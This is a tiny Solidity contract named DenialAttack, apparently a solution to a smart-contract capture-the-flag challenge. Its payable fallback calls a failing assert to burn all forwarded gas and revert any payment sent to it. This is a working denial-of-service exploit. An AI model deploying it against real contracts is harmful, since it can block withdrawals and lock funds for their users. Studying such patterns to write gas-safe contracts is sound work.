pragma solidity ^0.6.0;

contract DenialAttack {

  fallback() external payable {
      // consume all the gas
      assert(1==2);
  }

}
